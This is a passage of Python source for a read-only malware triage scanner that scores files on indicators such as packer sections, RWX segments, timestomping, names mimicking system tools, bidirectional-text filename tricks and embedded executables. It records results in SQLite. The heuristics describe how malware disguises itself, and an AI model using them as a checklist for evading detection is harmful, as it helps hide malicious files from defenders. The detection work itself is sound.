    # symlink in /usr/bin as world-writable.
    ctx["symlink_target"] = None
    if stat.S_ISLNK(lst.st_mode):
        try:
            ctx["symlink_target"] = os.readlink(path)
            st = os.stat(path)
        except OSError as e:
            ctx["errors"].append(f"broken symlink: {e}")
            return ctx
    else:
        st = lst
    ctx["size"] = st.st_size
    ctx["mode"] = stat.filemode(st.st_mode)
    ctx["uid"] = st.st_uid
    ctx["gid"] = st.st_gid
    ctx["setuid"] = bool(st.st_mode & stat.S_ISUID)
    ctx["setgid"] = bool(st.st_mode & stat.S_ISGID)
    ctx["world_writable"] = bool(st.st_mode & stat.S_IWOTH)
    ctx["executable"] = bool(st.st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH))
    ctx["symlink"] = ctx["symlink_target"] is not None
    ctx["hidden"] = os.path.basename(path).startswith(".")

    def iso(ts):
        try:
            return datetime.fromtimestamp(ts, tz=timezone.utc).replace(
                microsecond=0).isoformat()
        except (OverflowError, OSError, ValueError):
            return None

    ctx["mtime"] = iso(st.st_mtime)
    ctx["ctime"] = iso(st.st_ctime)
    ctx["atime"] = iso(st.st_atime)
    # ctime is set by the kernel on metadata change and cannot be set backwards by
    # ordinary means; mtime can. mtime far behind ctime is the classic timestomp shape.
    ctx["mtime_before_ctime_days"] = None
    try:
        delta = (st.st_ctime - st.st_mtime) / 86400.0
        ctx["mtime_before_ctime_days"] = round(delta, 1)
    except Exception:
        pass
    ctx["in_hot_dir"] = None
    real = os.path.realpath(path)
    for d, why in HOT_DIRECTORIES.items():
        if real == d or real.startswith(d.rstrip("/") + "/"):
            ctx["in_hot_dir"] = (d, why)
            break
    return ctx


_OWNER_CACHE: dict[str, str | None] = {}
_OWNER_CACHE_READY = False


def prime_owner_cache(paths: list[str]) -> None:
    """Ask the package manager about every path at once.

    One dpkg-query per file costs about 80 ms of process spawn, which dominates a
    scan of a system directory. Asking in batches turns a 70-second scan into a
    few seconds.
    """
    global _OWNER_CACHE_READY
    _OWNER_CACHE.clear()
    _OWNER_CACHE_READY = False
    if not (IS_LINUX and have("dpkg-query")) or not paths:
        return
    reals = [os.path.realpath(p) for p in paths]
    for i in range(0, len(reals), 400):
        batch = reals[i:i + 400]
        res = run(["dpkg-query", "-S"] + batch, timeout=120)
        for lineno in res["out"].splitlines():
            if ": " in lineno:
                pkgs, _, fpath = lineno.partition(": ")
                _OWNER_CACHE[fpath.strip()] = pkgs.split(",")[0].strip()
    for r in reals:
        _OWNER_CACHE.setdefault(r, None)
    _OWNER_CACHE_READY = True


def package_owner(path: str) -> tuple[str | None, str]:
    """Which package owns this file, if any. Returns (owner, status)."""
    real = os.path.realpath(path)
    if _OWNER_CACHE_READY and real in _OWNER_CACHE:
        return _OWNER_CACHE[real], "ok"
    if IS_LINUX and have("dpkg-query"):
        res = run(["dpkg-query", "-S", os.path.realpath(path)], timeout=20)
        if res["ok"] and ": " in res["out"]:
            return res["out"].split(": ", 1)[0].strip(), "ok"
        return None, "ok"
    if IS_LINUX and have("rpm"):
        res = run(["rpm", "-qf", os.path.realpath(path)], timeout=20)
        if res["ok"] and res["out"].strip() and "not owned" not in res["out"]:
            return res["out"].strip().splitlines()[0], "ok"
        return None, "ok"
    return None, "unavailable"


SYSTEM_TOOL_NAMES = {
    "ls", "ps", "top", "netstat", "ss", "ifconfig", "ip", "systemd", "sshd", "bash", "sh",
    "cron", "crond", "init", "kthreadd", "sudo", "su", "passwd", "login", "nginx", "httpd",
    "apache2", "mysqld", "postgres", "docker", "containerd", "kubelet", "rsyslogd",
    "svchost", "lsass", "csrss", "explorer", "services", "winlogon", "smss", "conhost",
}
SYSTEM_DIRS = ("/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin",
               "/usr/local/sbin", "/lib", "/usr/lib", "C:\\Windows")
RTL_CHARS = "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069"


def build_indicators(path: str, data: bytes, fmt: str, parsed: dict, strings: dict,
                     embedded: list, ctx: dict, owner: tuple, truncated: bool) -> list:
    """Turn the parsed facts into indicators. Each one says why it matters AND
    when it is entirely normal - because on a healthy machine most of these fire
    for ordinary reasons."""
    ind: list[Indicator] = []
    base = os.path.basename(path)
    real = os.path.realpath(path)
    add = ind.append

    # ---- location and filesystem ----
    if ctx.get("in_hot_dir") and (ctx.get("executable")
                                 or fmt in ("ELF", "PE", "Mach-O", "script")):
        d, why = ctx["in_hot_dir"]
        add(Indicator("loc.hot-dir", f"Executable in {d}", "medium",
                      f"{why}.", real,
                      "Build systems, package installers and test harnesses put "
                      "executables here constantly."))
    if ctx.get("setuid") and owner[0] is None and owner[1] == "ok":
        add(Indicator("fs.setuid-unowned", "Setuid binary owned by no package", "high",
                      "A setuid file runs as its owner - usually root - no matter who "
                      "starts it. This one was not installed by the package manager, so "
                      "nothing will ever update or verify it.",
                      f"{ctx.get('mode')} uid={ctx.get('uid')}",
                      "Hand-compiled tools and some vendor installers legitimately ship "
                      "setuid binaries."))
    elif ctx.get("setuid"):
        add(Indicator("fs.setuid", "Setuid binary", "low",
                      "Runs with the privileges of its owner regardless of who starts it.",
                      f"{ctx.get('mode')} uid={ctx.get('uid')}",
                      "Perfectly normal for sudo, passwd, ping, mount and similar."))
    if ctx.get("world_writable") and ctx.get("executable"):
        add(Indicator("fs.world-writable", "Executable is world-writable", "high",
                      "Any user on this machine can replace the contents of a file that "
                      "others will run.",
                      ctx.get("mode", ""),
                      "Occasionally seen in shared development directories."))
    if ctx.get("hidden") and ctx.get("executable"):
        add(Indicator("fs.hidden", "Hidden executable", "low",
                      "The leading dot keeps it out of ordinary directory listings.",
                      base, "Dotfiles and per-user tool directories do this all the time."))
    d = ctx.get("mtime_before_ctime_days")
    if d is not None and d > 30:
        add(Indicator("fs.timestomp", "Modification time is far older than the inode "
                      "change time", "medium",
                      "mtime can be set to any value; ctime is maintained by the kernel and "
                      "cannot ordinarily be moved backwards. A large gap is the shape left "
                      "by timestamp tampering.",
                      f"mtime {ctx.get('mtime')}, ctime {ctx.get('ctime')} "
                      f"({d:.0f} days apart)",
                      "Archive extraction, rsync, package installs and restores from backup "
                      "all preserve mtime and produce exactly this pattern - which makes "
                      "this a weak signal on its own."))
    if owner[1] == "ok" and owner[0] is None and real.startswith(SYSTEM_DIRS[:4]):
        add(Indicator("fs.unowned-system-path", "In a system directory but owned by no "
                      "package", "medium",
                      "Files in system binary directories are normally installed and "
                      "tracked by the package manager. This one is not, so no updater "
                      "knows it exists.", real,
                      "Locally compiled software and vendor scripts land here legitimately."))
    if base.lower() in SYSTEM_TOOL_NAMES and not real.startswith(SYSTEM_DIRS):
        add(Indicator("name.masquerade", f"Named after a system tool but not in a system "
                      f"directory", "high",
                      "Using the name of a common system binary is a cheap way to look "
                      "unremarkable in a process listing.",
                      f"{base} at {real}",
                      "Local builds, containers and test fixtures often carry these names."))
    if any(c in path for c in RTL_CHARS):
        add(Indicator("name.rtl", "Filename contains bidirectional text control characters",
                      "high",
                      "These characters reverse how the name is displayed, which can make "
                      "an executable appear to be a document.",
                      repr(base),
                      "Legitimate in genuinely right-to-left filenames, which are rare in "
                      "system paths."))
    ext = os.path.splitext(base)[1].lower()
    doc_ext = {".txt", ".pdf", ".doc", ".docx", ".jpg", ".jpeg", ".png", ".gif", ".mp3",
               ".mp4", ".csv", ".log", ".md", ".json", ".xml"}
    if ext in doc_ext and fmt in ("ELF", "PE", "Mach-O"):
        add(Indicator("name.extension-mismatch", f"{fmt} executable with a '{ext}' "
                      f"extension", "critical",
                      "The contents are an executable but the name suggests a document. "
                      "This is deliberate disguise; it does not happen by accident.",
                      f"{base}: header says {fmt}",
                      "Almost nothing legitimate does this. Investigate."))
    if re.search(r"\.(?:txt|pdf|doc|jpg|png)\.(?:exe|scr|com|bat|cmd|pif)$", base, re.I):
        add(Indicator("name.double-extension", "Double extension", "high",
                      "A name like invoice.pdf.exe relies on the real extension being "
                      "hidden by the file manager.", base,
                      "Occasionally produced by clumsy automated tooling."))

    if truncated:
        add(Indicator("scan.truncated", "File too large to parse fully", "info",
                      f"Only the first {fmt_bytes(MAX_FILE_BYTES)} were parsed, so header "
                      f"and string checks may be incomplete. This is a limit of the scan, "
                      f"not a property of the file.",
                      f"size {fmt_bytes(ctx.get('size'))}",
                      "Large installers and games are routinely this size."))

    # ---- format specific ----
    if fmt == "ELF" and parsed.get("ok"):
        for seg in parsed.get("segments", []):
            if seg["perm"] == "rwx":
                add(Indicator("elf.rwx-segment", "Memory segment is writable AND executable",
                              "high",
                              "Code that can rewrite itself defeats most memory protections "
                              "and is the standard shape of a runtime unpacker.",
                              f"segment at 0x{seg['vaddr']:x}, {fmt_bytes(seg['memsz'])}",
                              "Some JIT runtimes and older toolchains produce RWX segments "
                              "legitimately."))
                break
        if parsed.get("nx") is False:
            add(Indicator("elf.no-nx", "Executable stack", "medium",
                          "The stack is marked executable, which re-enables a whole class "
                          "of exploitation technique.", "PT_GNU_STACK is RWX",
                          "Some language runtimes and old binaries need this."))
        for rp in parsed.get("rpath", []) + parsed.get("runpath", []):
            if rp.startswith((".", "/tmp", "/var/tmp")) or "$ORIGIN" not in rp and \
                    not rp.startswith("/usr") and not rp.startswith("/opt") and \
                    not rp.startswith("/lib"):
                add(Indicator("elf.rpath", "Unusual library search path baked into the "
                              "binary", "medium",
                              "RPATH and RUNPATH tell the loader where to find libraries. "
                              "A writable or relative path there lets someone substitute a "
                              "library.", rp,
                              "Bundled applications commonly use $ORIGIN-relative paths."))
                break
        for sec in parsed.get("sections", []):
            if sec["name"].upper().startswith("UPX") or sec["name"] in PACKER_SECTIONS:
                add(Indicator("elf.packer-section", f"Packer section name: {sec['name']}",
                              "medium",
                              "Section naming matches a known executable packer.",
                              sec["name"],
                              "Packing is legal and common for legitimate software "
                              "distribution and size reduction."))
                break
        code = [s for s in parsed.get("sections", [])
                if s["name"] in (".text", ".init", ".fini") and s["size"] > 4096]
        for s in code:
            if s["entropy"] > 7.2:
                add(Indicator("elf.high-entropy-code", f"Code section '{s['name']}' has "
                              f"entropy {s['entropy']}", "medium",
                              "Compiled machine code normally measures around 6. Values "
                              "above 7.2 suggest the section is compressed or encrypted, "
                              "which is what a packer leaves behind.",
                              f"{s['name']}: entropy {s['entropy']}, {fmt_bytes(s['size'])}",
                              "Binaries with large embedded compressed resources can look "
                              "like this too."))
                break
        if not parsed.get("sections") and parsed.get("segments"):
            add(Indicator("elf.no-sections", "No section header table", "medium",
                          "Section headers are not needed to run a binary, so packers and "
                          "some obfuscators remove them to frustrate analysis.",
                          "; ".join(parsed.get("errors", [])) or "shnum = 0",
                          "Heavily stripped release builds and some embedded toolchains do "
                          "this legitimately."))
        if parsed.get("static") and parsed.get("type_id") == 2:
            add(Indicator("elf.static", "Statically linked", "low",
                          "A static binary carries everything it needs and runs anywhere, "
                          "which is convenient for a dropped payload.",
                          "no PT_INTERP segment",
                          "Go and Rust binaries are static by default, as are many "
                          "container images and busybox-style tools."))

    if fmt == "PE" and parsed.get("ok"):
        for sec in parsed.get("sections", []):
            packer = PACKER_SECTIONS.get(sec["name"])
            if packer:
                add(Indicator("pe.packer-section", f"{packer} packer section: {sec['name']}",
                              "medium", "Section naming matches a known packer or protector.",
                              sec["name"],
                              "Commercial software is frequently packed to deter copying."))
                break
        for sec in parsed.get("sections", []):
            if sec["perm"] == "rwx":
                add(Indicator("pe.rwx-section", f"Section '{sec['name']}' is writable AND "
                              f"executable", "high",
                              "Self-modifying code defeats memory protections and is the "
                              "usual shape of an unpacking stub.", sec["name"],
                              "Some older compilers and installers produce RWX sections."))
                break
            if sec["vsize"] > 0 and sec["rawsize"] == 0 and sec["perm"].endswith("x"):
                add(Indicator("pe.empty-code-section", f"Executable section '{sec['name']}' "
                              f"has no data on disk", "high",
                              "The section is allocated at runtime but empty in the file, "
                              "which is how a packer reserves space to unpack into.",
                              f"{sec['name']}: virtual {fmt_bytes(sec['vsize'])}, raw 0",
                              "Legitimate in .bss-style sections that are not executable."))
                break
        for sec in parsed.get("sections", []):
            if sec["entropy"] > 7.4 and sec["rawsize"] > 4096:
                add(Indicator("pe.high-entropy-section", f"Section '{sec['name']}' has "
                              f"entropy {sec['entropy']}", "medium",
                              "Near-maximum entropy means compressed or encrypted content.",
                              f"{sec['name']}: {sec['entropy']}, {fmt_bytes(sec['rawsize'])}",
                              "Embedded archives, media and installers legitimately reach "
                              "these values."))
                break
        all_imports = {f for funcs in parsed.get("imports", {}).values() for f in funcs}
        for group, meta in PE_API_GROUPS.items():
            hit = sorted(all_imports & meta["apis"])
            if len(hit) >= meta["need"]:
                add(Indicator(f"pe.api.{group}", f"Imports suggest {group.replace('-', ' ')}",
                              meta["severity"], meta["why"], ", ".join(hit[:10]),
                              meta["benign"]))
        if parsed.get("imports") and len(all_imports) < 8 and \
                {"LoadLibraryA", "GetProcAddress"} & all_imports:
            add(Indicator("pe.tiny-import-table", "Very small import table with dynamic "
                          "resolution", "medium",
                          "Almost nothing is imported statically, but the file can resolve "
                          "anything at runtime. Packed executables look exactly like this.",
                          f"{len(all_imports)} imported function(s)",
                          "Small utilities and some loaders are legitimately built this way."))
        if parsed.get("tls_callbacks"):
            add(Indicator("pe.tls-callback", "TLS callbacks present", "low",
                          "TLS callbacks run before the program's entry point, which is a "
                          "way to execute code before a debugger has settled.",
                          "data directory 9 is populated",
                          "Thread-local storage is an ordinary language feature."))
        if not parsed.get("signed_directory"):
            add(Indicator("pe.unsigned", "No embedded code signature", "low",
                          "There is no certificate table in the file. Note that this tool "
                          "only checks whether a signature is PRESENT - it cannot verify "
                          "one, which needs a full crypto stack and a trust store.",
                          "certificate data directory is empty",
                          "Most in-house tools and open source builds are unsigned."))
        ts = parsed.get("timestamp_raw") or 0
        if ts == 0:
            add(Indicator("pe.zero-timestamp", "Build timestamp is zero", "low",
                          "A zeroed timestamp hides when the file was built.",
                          "TimeDateStamp = 0",
                          "Reproducible-build toolchains zero this deliberately."))
        elif parsed.get("timestamp") and parsed["timestamp"] > now_iso():
            add(Indicator("pe.future-timestamp", "Build timestamp is in the future", "medium",
                          "Either the clock was wrong when it was built, or the header was "
                          "edited.", parsed["timestamp"],
                          "A misconfigured build machine produces this."))
        if parsed.get("overlay", 0) > 1024:
            add(Indicator("pe.overlay", f"{fmt_bytes(parsed['overlay'])} of data appended "
                          f"after the last section", "low",
                          "Data past the end of the mapped image is invisible to the loader "
                          "and is a convenient place to hide a payload or configuration.",
                          f"overlay {fmt_bytes(parsed['overlay'])}",
                          "Installers, self-extracting archives and signed binaries all "
                          "carry overlay data normally."))
        if parsed.get("aslr") is False:
            add(Indicator("pe.no-aslr", "Address space layout randomisation disabled", "low",
                          "The image asks to be loaded at a fixed address.",
                          "DYNAMICBASE flag not set",
                          "Older software and some drivers require fixed addresses."))

    # ---- content ----
    for hit in strings.get("hits", []):
        add(Indicator(f"str.{hit['label'].replace(' ', '-')[:28]}",
                      f"String indicates {hit['label']}", hit["severity"],
                      "A string in the file matches a pattern associated with this "
                      "behaviour. A string is not proof the behaviour happens - it may be "
                      "in a help message, a test case or a detection rule.",
                      hit["match"], hit["benign"]))
    if strings.get("onions"):
        add(Indicator("net.onion", "Tor hidden service address", "high",
                      "A .onion address in a binary points at infrastructure designed to "
                      "resist attribution.", ", ".join(strings["onions"][:5]),
                      "Tor clients, privacy tools and browsers legitimately contain these."))
    n_urls, n_ips = len(strings.get("urls", [])), len(strings.get("ips", []))
    if n_ips >= 5:
        add(Indicator("net.many-ips", f"{n_ips} distinct IP addresses embedded", "low",
                      "Hard-coded addresses can be command and control endpoints, and "
                      "avoid DNS entirely.", ", ".join(strings["ips"][:8]),
                      "Network tools, test suites and anything with a bundled default "
                      "configuration carry many addresses."))
    if n_urls >= 1:
        # deliberately info-only: essentially every real binary embeds URLs, so
        # scoring them punishes /bin/ls as much as a downloader
        add(Indicator("net.urls", f"{n_urls} URL(s) embedded", "info",
                      "Where a program reaches out is worth knowing.",
                      "; ".join(strings["urls"][:6]),
                      "Almost every real program embeds URLs - documentation links, update "
                      "endpoints, schema namespaces."))
    whole = None
    try:
        whole = float(entropy(data[:2 * 1024 * 1024]))
    except Exception:
        whole = None
    if whole is not None and whole > 7.5 and ctx.get("executable") and fmt == "data":
        add(Indicator("content.opaque-executable", f"Executable file is not a recognisable "
                      f"format and has entropy {whole}", "medium",
                      "The execute bit is set, but the contents match no executable format "
                      "this tool knows and are effectively incompressible. That is the "
                      "shape of an encrypted payload or a raw blob waiting to be loaded by "
                      "something else.",
                      f"entropy {whole} over {fmt_bytes(min(len(data), 2 * 1024 * 1024))}",
                      "Compressed archives, encrypted containers, disk images and media "
                      "files all reach this entropy legitimately - and a stray execute bit "
                      "on one of those is a common and harmless mistake."))
    elif whole is not None and whole > 7.9 and fmt == "data":
        add(Indicator("content.high-entropy", f"Entropy {whole} - compressed or encrypted",
                      "info",
                      "Near-maximum entropy across the whole file. Stated as context; on "
                      "its own it says only that the contents are not plain text or code.",
                      f"entropy {whole}",
                      "Normal for any archive, media file or encrypted container."))

    for emb in embedded[:1]:
        add(Indicator("content.embedded-exe", f"{emb['type']} executable embedded at offset "
                      f"{emb['offset']}", "medium",
                      "A second executable inside this one is how droppers carry their "
                      "payload.", f"offset {emb['offset']} ({emb['type']} header)",
                      "Installers, self-extracting archives, debug bundles and container "
                      "tools all legitimately embed executables."))
    return ind


# =============================================================================
# SECTION 4 - Scanning
# =============================================================================

def inspect_file(path: str, quick: bool = False) -> dict:
    """Full static analysis of one file. Opens read-only; never executes."""
    res = {"path": path, "real_path": os.path.realpath(path), "error": None,
           "format": "data", "indicators": [], "score": 0.0, "priority": "",
           "sha256": None, "entropy": None, "parsed": {}, "strings": {},
           "embedded": [], "context": {}, "owner": None, "owner_status": "unavailable"}
    ctx = filesystem_context(path)
    res["context"] = ctx
    if ctx.get("errors"):
        res["error"] = "; ".join(ctx["errors"])
        res["format"] = "unreadable"
        return res
    size = ctx.get("size", 0)
    digest, herr = sha256_of(path)
    if herr:
        res["error"] = f"could not hash: {herr}"
        res["format"] = "unreadable"
        return res
    res["sha256"] = digest
    truncated = size > MAX_FILE_BYTES
    try:
        with open(path, "rb") as fh:
            data = fh.read(min(size, MAX_FILE_BYTES))
    except OSError as e:
        res["error"] = str(e)
        res["format"] = "unreadable"
        return res
    res["format"] = detect_format(data, path)
    res["entropy"] = entropy(data[:2 * 1024 * 1024])
    if res["format"] == "ELF":
        res["parsed"] = parse_elf(data)
    elif res["format"] == "PE":
        res["parsed"] = parse_pe(data)
    elif res["format"] == "Mach-O":
        res["parsed"] = parse_macho(data)
    res["strings"] = {} if quick else analyse_strings(data)
    res["embedded"] = [] if quick else find_embedded_executables(data)
    owner, ostatus = package_owner(path)
    res["owner"], res["owner_status"] = owner, ostatus
    inds = build_indicators(path, data, res["format"], res["parsed"], res["strings"],
                            res["embedded"], ctx, (owner, ostatus), truncated)
    if quick:
        inds.append(Indicator("scan.quick", "Quick mode: content checks skipped", "info",
                              "String extraction and embedded-executable detection were "
                              "not run, so content indicators are unknown rather than "
                              "absent.", "--quick", ""))
    if ostatus == "unavailable":
        inds.append(Indicator("scan.no-package-db", "Package ownership could not be checked",
                              "info",
                              "No supported package manager was available to ask whether "
                              "this file belongs to an installed package, so the "
                              "'owned by no package' checks were not performed.",
                              "dpkg-query and rpm are both unavailable", ""))
    res["indicators"] = inds
    res["score"] = round(clamp(sum(i.weight for i in inds), 0.0, 100.0), 1)
    res["priority"] = priority_of(res["score"])[0]
    return res


def is_candidate(path: str, all_files: bool) -> bool:
    """Which files are worth opening. Executables plus anything whose magic says so."""
    try:
        st = os.lstat(path)
    except OSError:
        return False
    if stat.S_ISLNK(st.st_mode) or not stat.S_ISREG(st.st_mode) or st.st_size < 4:
        return False
    if all_files:
        return True
    if st.st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH):
        return True
    if os.path.splitext(path)[1].lower() in (".exe", ".dll", ".sys", ".scr", ".com",
                                             ".so", ".dylib", ".msi", ".bin", ".elf"):
        return True
    try:
        with open(path, "rb") as fh:
            head = fh.read(4)
        return head[:4] == b"\x7fELF" or head[:2] == b"MZ" or head[:2] == b"#!"
    except OSError:
        return False


def walk_targets(paths: list[str], recursive: bool = True, max_files: int = 3000,
                 all_files: bool = False, follow_symlinks: bool = False) -> tuple[list, dict]:
    """Collect candidate files. Returns (files, stats-with-honest-errors)."""
    found, stats = [], {"considered": 0, "skipped_unreadable": 0, "dirs_denied": [],
                        "missing": [], "hit_limit": False}
    seen = set()
    for target in paths:
        if not os.path.exists(target):
            stats["missing"].append(target)
            continue
        if os.path.isfile(target):
            stats["considered"] += 1
            if target not in seen:
                seen.add(target)
                found.append(target)
            continue
        for root, dirs, files in os.walk(target, followlinks=follow_symlinks,
                                         onerror=lambda e: stats["dirs_denied"].append(
                                             getattr(e, "filename", str(e)))):
            if not recursive:
                dirs[:] = []
            dirs[:] = [d for d in dirs if d not in ("proc", "sys", "dev")
                       or root != "/"]
            for name in files:
                p = os.path.join(root, name)
                stats["considered"] += 1
                if len(found) >= max_files:
                    stats["hit_limit"] = True
                    return found, stats
                try:
                    if is_candidate(p, all_files) and p not in seen:
                        seen.add(p)
                        found.append(p)
                except OSError:
                    stats["skipped_unreadable"] += 1
    return found, stats


# =============================================================================
# SECTION 5 - Database
# =============================================================================

SCHEMA = """
CREATE TABLE IF NOT EXISTS scans (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ts TEXT NOT NULL, hostname TEXT, os_version TEXT, paths TEXT, recursive INTEGER,
    quick INTEGER, all_files INTEGER, duration_ms INTEGER,
    considered INTEGER DEFAULT 0, scanned INTEGER DEFAULT 0, unreadable INTEGER DEFAULT 0,
    dirs_denied INTEGER DEFAULT 0, hit_limit INTEGER DEFAULT 0, missing TEXT,
    files_flagged INTEGER DEFAULT 0, top_score REAL DEFAULT 0,
    critical INTEGER DEFAULT 0, high INTEGER DEFAULT 0, medium INTEGER DEFAULT 0,
    low INTEGER DEFAULT 0, info INTEGER DEFAULT 0, note TEXT
);
CREATE TABLE IF NOT EXISTS files (
    id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id INTEGER NOT NULL,
    path TEXT, real_path TEXT, format TEXT, size INTEGER, sha256 TEXT, entropy REAL,
    score REAL, priority TEXT, indicator_count INTEGER DEFAULT 0,
    critical INTEGER DEFAULT 0, high INTEGER DEFAULT 0, medium INTEGER DEFAULT 0,
    low INTEGER DEFAULT 0, info INTEGER DEFAULT 0,
    owner_package TEXT, owner_status TEXT, mode TEXT, setuid INTEGER DEFAULT 0,
    mtime TEXT, ctime TEXT, summary TEXT, error TEXT, approved INTEGER DEFAULT 0,
    FOREIGN KEY (scan_id) REFERENCES scans(id)
);
CREATE TABLE IF NOT EXISTS indicators (
    id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id INTEGER NOT NULL, file_id INTEGER NOT NULL,
    code TEXT, title TEXT, severity TEXT, detail TEXT, evidence TEXT, benign TEXT,
    FOREIGN KEY (file_id) REFERENCES files(id)
);
CREATE TABLE IF NOT EXISTS baseline (
    sha256 TEXT PRIMARY KEY, path TEXT, label TEXT, approved_at TEXT, approved_by TEXT,
    note TEXT
);
CREATE TABLE IF NOT EXISTS audit_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ts TEXT NOT NULL, level TEXT NOT NULL, source TEXT, message TEXT, scan_id INTEGER
);
CREATE INDEX IF NOT EXISTS idx_files_scan ON files(scan_id);
CREATE INDEX IF NOT EXISTS idx_files_score ON files(score);
CREATE INDEX IF NOT EXISTS idx_files_hash ON files(sha256);
CREATE INDEX IF NOT EXISTS idx_ind_file ON indicators(file_id);
CREATE INDEX IF NOT EXISTS idx_ind_code ON indicators(code);
CREATE INDEX IF NOT EXISTS idx_audit_ts ON audit_log(ts);
"""

_DB_PATH = DEFAULT_DB


def set_db_path(p: str) -> None:
    global _DB_PATH
    _DB_PATH = p


def db_path() -> str:
    return _DB_PATH


def connect(path: str | None = None) -> sqlite3.Connection:
    conn = sqlite3.connect(path or _DB_PATH, timeout=30.0)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=30000")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn


def init_db(conn=None) -> None:
    own = conn is None
    conn = conn or connect()
    try:
        conn.executescript(SCHEMA)
        conn.commit()
    finally:
        if own:
            conn.close()


def q(sql: str, args: tuple = (), conn=None) -> list[sqlite3.Row]:
    own = conn is None
    conn = conn or connect()
    try:
        return conn.execute(sql, args).fetchall()
    finally:
        if own:
            conn.close()


def q1(sql: str, args: tuple = (), conn=None):
    rows = q(sql, args, conn)
    return rows[0] if rows else None


def log_event(level: str, source: str, message: str, scan_id=None, conn=None) -> None:
    own = conn is None
    conn = conn or connect()
    try:
        conn.execute("INSERT INTO audit_log (ts, level, source, message, scan_id) "
                     "VALUES (?,?,?,?,?)",
                     (now_iso(), level.upper(), source,
                      " ".join(str(message).split())[:1000], scan_id))
        conn.commit()
    except Exception:
        pass
    finally:
        if own:
            conn.close()


def load_baseline(conn=None) -> dict:
    return {r["sha256"]: dict(r) for r in q("SELECT * FROM baseline", (), conn)}


def approve_hash(sha256: str, path: str = "", label: str = "", note: str = "") -> None:
    conn = connect()
    try:
        init_db(conn)
        conn.execute("INSERT INTO baseline (sha256, path, label, approved_at, approved_by,"
                     " note) VALUES (?,?,?,?,?,?) ON CONFLICT(sha256) DO UPDATE SET "
                     "label=excluded.label, approved_at=excluded.approved_at",
                     (sha256, path, label, now_iso(),
                      os.environ.get("USER") or "unknown", note))
        conn.commit()
        log_event("INFO", "baseline", f"Marked {sha256[:16]}... as reviewed"
                  + (f" ({label})" if label else ""), None, conn)
    finally:
        conn.close()


def revoke_hash(sha256: str) -> int:
    conn = connect()
    try:
        n = conn.execute("DELETE FROM baseline WHERE sha256=?", (sha256,)).rowcount
        conn.commit()
        return n
    finally:
        conn.close()


def latest_scan_id(conn=None):
    row = q1("SELECT id FROM scans ORDER BY id DESC LIMIT 1", (), conn)
    return row["id"] if row else None


def scan_summary(scan_id: int, conn=None):
    row = q1("SELECT * FROM scans WHERE id=?", (scan_id,), conn)
    return dict(row) if row else None


def run_scan(paths: list[str], recursive: bool = True, quick: bool = False,
             max_files: int = 3000, all_files: bool = False, note: str = "",
             progress=None) -> int:
    t0 = time.time()
    targets, stats = walk_targets(paths, recursive, max_files, all_files)
    if progress:
        progress(0, len(targets), "asking the package manager about every file at once")
    prime_owner_cache(targets)
    baseline = load_baseline()
    conn = connect()
    try:
        init_db(conn)
        cur = conn.execute(
            "INSERT INTO scans (ts, hostname, os_version, paths, recursive, quick,"
            " all_files, considered, scanned, unreadable, dirs_denied, hit_limit, missing,"
            " note) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
            (now_iso(), socket.gethostname(), platform.platform(), json.dumps(paths),
             int(recursive), int(quick), int(all_files), stats["considered"], 0,
             stats["skipped_unreadable"], len(stats["dirs_denied"]),
             int(stats["hit_limit"]), json.dumps(stats["missing"]), note))
        sid = cur.lastrowid
        conn.commit()
        counts = {s: 0 for s in SEVERITIES}
        flagged, top, scanned = 0, 0.0, 0
        for i, path in enumerate(targets):
            if progress:
                progress(i + 1, len(targets), path)
            res = inspect_file(path, quick=quick)
            scanned += 1
            approved = res["sha256"] in baseline if res["sha256"] else False
            per = {s: sum(1 for x in res["indicators"] if x.severity == s)
                   for s in SEVERITIES}
            for s in SEVERITIES:
                counts[s] += per[s]
            score = 0.0 if approved else res["score"]
            if score >= 15:
                flagged += 1
            top = max(top, score)
            ctx = res["context"]
            summary = _one_line_summary(res)
            fcur = conn.execute(
                "INSERT INTO files (scan_id, path, real_path, format, size, sha256, entropy,"
                " score, priority, indicator_count, critical, high, medium, low, info,"
                " owner_package, owner_status, mode, setuid, mtime, ctime, summary, error,"
                " approved) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (sid, res["path"], res["real_path"], res["format"], ctx.get("size"),
                 res["sha256"], res["entropy"], score, priority_of(score)[0],
                 len(res["indicators"]), per["critical"], per["high"], per["medium"],
                 per["low"], per["info"], res["owner"], res["owner_status"],
                 ctx.get("mode"), int(bool(ctx.get("setuid"))), ctx.get("mtime"),
                 ctx.get("ctime"), summary, res["error"], int(approved)))
            fid = fcur.lastrowid
            for ind in res["indicators"]:
                conn.execute("INSERT INTO indicators (scan_id, file_id, code, title,"
                             " severity, detail, evidence, benign) VALUES (?,?,?,?,?,?,?,?)",
                             (sid, fid, ind.code, ind.title, ind.severity, ind.detail,
                              ind.evidence, ind.benign))
        conn.execute("UPDATE scans SET scanned=?, files_flagged=?, top_score=?, duration_ms=?,"
                     " critical=?, high=?, medium=?, low=?, info=? WHERE id=?",
                     (scanned, flagged, top, int((time.time() - t0) * 1000),
                      counts["critical"], counts["high"], counts["medium"], counts["low"],
                      counts["info"], sid))
        conn.commit()
        log_event("INFO", "scan", f"Scan #{sid}: {scanned} file(s) examined from "
                  f"{stats['considered']} considered, {flagged} above the review threshold, "
                  f"highest attention score {top}", sid, conn)
        if stats["dirs_denied"]:
            log_event("WARN", "scan", f"{len(stats['dirs_denied'])} directory(ies) could not "
                      f"be read: {', '.join(stats['dirs_denied'][:5])}", sid, conn)
        if stats["missing"]:
            log_event("WARN", "scan", f"path(s) not found: {', '.join(stats['missing'])}",
                      sid, conn)
        if stats["hit_limit"]:
            log_event("WARN", "scan", f"stopped at the {max_files}-file limit; the scan is "
                      f"incomplete", sid, conn)
        return sid
    finally:
        conn.close()


def _one_line_summary(res: dict) -> str:
    p = res.get("parsed") or {}
    if res["format"] == "ELF" and p.get("ok"):
